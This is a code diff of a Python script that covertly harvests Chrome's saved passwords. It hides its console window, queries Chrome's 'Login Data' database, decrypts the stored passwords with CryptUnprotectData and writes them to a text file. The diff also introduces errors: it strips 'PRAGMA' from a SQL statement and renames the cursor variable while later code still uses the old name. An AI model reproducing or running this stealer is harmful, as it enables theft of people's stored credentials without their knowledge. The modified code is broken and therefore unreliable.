@@ -15,20 +15,20 @@ import sqlite3
 import win32crypt
 import os
 
-#If we want to hide the console
+#If we want to hide the console 
 import win32console, win32gui
 window = win32console.GetConsoleWindow()
 win32gui.ShowWindow(window, 0)
 
 #Lets Connect to the Database
 conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default chrome location for details
-cursor = conn.cursor()
-conn.execute("PRAGMA busy_timeout = 300000")   # Added PRAGMA busy_timneout to wait the other transaction to finish,
-cursor.execute('Select action_url, username_value, password_value FROM logins')
-fp = open(r"Chromepass.txt", "a+")
+connection = conn.cursor()
+conn.execute(" busy_timeout = 300000") 
+connection.execute('Select action_url, username_value, password_value FROM logins')
+myfile = open(r"Chromepass.txt", "a+")
 
 # we write to the file
-fp.write("Chrome Saved Passwords\n")
+myfile.write("Chrome Saved Passwords\n")
 for result in cursor.fetchall():
 
     password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
